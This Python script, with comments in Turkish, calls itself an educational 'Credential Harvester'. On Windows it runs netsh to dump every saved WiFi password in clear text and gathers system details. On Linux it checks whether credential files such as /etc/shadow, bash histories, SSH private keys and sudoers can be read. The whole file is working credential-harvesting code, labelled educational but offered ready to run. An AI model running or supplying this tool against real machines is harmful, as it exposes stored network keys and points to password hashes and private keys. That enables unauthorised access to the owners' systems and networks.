#!/usr/bin/env python3
"""
Credential Harvester (Eğitim Amaçlı)
=====================================
Windows: Kayıtlı WiFi şifreleri ve sistem bilgileri toplar.
Linux: /etc/shadow, .bash_history gibi hassas dosyaları kontrol eder.
"""
import os
import sys
import subprocess
import platform

def harvest_wifi_windows():
    """Windows kayıtlı WiFi şifrelerini çek"""
    print("[*] WiFi şifreleri taranıyor...")
    print("-" * 50)
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True, timeout=10
        )
        profiles = [
            line.split(":")[1].strip()
            for line in result.stdout.split("\n")
            if "All User Profile" in line or "Tüm Kullanıcı Profili" in line
        ]
        for profile in profiles:
            try:
                detail = subprocess.run(
                    ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                    capture_output=True, text=True, timeout=10
                )
                pwd_lines = [
                    l.split(":")[1].strip()
                    for l in detail.stdout.split("\n")
                    if "Key Content" in l or "Anahtar İçeriği" in l
                ]
                pwd = pwd_lines[0] if pwd_lines else "Şifre yok / Gösterilemiyor"
                print(f"  📶 {profile:<30} → {pwd}")
            except:
                print(f"  📶 {profile:<30} → Okunamadı")
    except Exception as e:
        print(f"[-] Hata: {e}")

def harvest_system_info():
    """Temel sistem bilgilerini topla"""
    print("\n[*] Sistem bilgileri toplanıyor...")
    print("-" * 50)
    info = {
        "İşletim Sistemi": platform.platform(),
        "Hostname": platform.node(),
        "Mimari": platform.machine(),
        "Kullanıcı": os.environ.get("USERNAME", os.environ.get("USER", "Bilinmiyor")),
        "Home Dizini": os.path.expanduser("~"),
    }
    for k, v in info.items():
        print(f"  {k:<20}: {v}")

def harvest_linux():
    """Linux hassas dosya kontrolü"""
    print("[*] Hassas dosyalar kontrol ediliyor...")
    print("-" * 50)
    targets = [
        "/etc/shadow", "/etc/passwd", "/root/.bash_history",
        os.path.expanduser("~/.bash_history"),
        os.path.expanduser("~/.ssh/id_rsa"),
        "/etc/sudoers",
    ]
    for f in targets:
        if os.path.exists(f):
            readable = os.access(f, os.R_OK)
            status = "✅ Okunabilir" if readable else "🔒 Erişim yok"
            print(f"  {f:<40} — {status}")
        else:
            print(f"  {f:<40} — ❌ Yok")

if __name__ == "__main__":
    print("=" * 50)
    print("  Credential Harvester — Bilgi Toplama")
    print("=" * 50)
    harvest_system_info()

    if os.name == 'nt':
        harvest_wifi_windows()
    else:
        harvest_linux()
    print("\n[+] Tarama tamamlandı.")
